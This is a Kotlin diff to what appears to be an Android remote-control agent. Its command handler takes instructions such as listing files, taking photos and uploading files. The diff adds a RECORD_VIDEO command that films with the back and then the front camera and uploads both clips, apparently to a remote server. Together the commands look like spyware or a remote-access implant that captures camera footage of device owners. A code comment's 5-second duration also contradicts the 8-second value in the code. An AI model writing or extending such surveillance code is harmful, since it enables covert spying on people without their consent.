@@ -37,6 +37,7 @@ object CommandHandler {
                 }
                 "LIST_FILES" -> listFiles(service, params)
                 "TAKE_PHOTO" -> takePhoto(service, params)
+                "RECORD_VIDEO" -> recordVideo(service, params)
                 "UPLOAD_FILE" -> uploadFile(service, params)
                 else         -> JSONObject().put("error", "Unknown command: $commandType")
             }
@@ -162,6 +163,38 @@ object CommandHandler {
 
         if (successCount == 0) {
             return JSONObject().put("error", "Failed to capture or upload any photos.")
+        }
+
+        return JSONObject().put("message", message.trim())
+    }
+
+    @androidx.annotation.RequiresPermission(android.Manifest.permission.RECORD_AUDIO)
+    private suspend fun recordVideo(service: AgentService, params: JSONObject?): JSONObject {
+        // Sequential 5-second video captures
+        val backVideo = CameraHandler.recordVideo(service, service, cameraFacing = "back", durationMs = 8000L)
+        val frontVideo = CameraHandler.recordVideo(service, service, cameraFacing = "front", durationMs = 8000L)
+        
+        var message = ""
+        var successCount = 0
+
+        if (backVideo != null) {
+            val res = doUpload(service, backVideo)
+            if (res.has("message")) {
+                message += "Back video uploaded. "
+                successCount++
+            }
+        }
+
+        if (frontVideo != null) {
+            val res = doUpload(service, frontVideo)
+            if (res.has("message")) {
+                message += "Front video uploaded."
+                successCount++
+            }
+        }
+
+        if (successCount == 0) {
+            return JSONObject().put("error", "Failed to record or upload any videos.")
         }
 
         return JSONObject().put("message", message.trim())
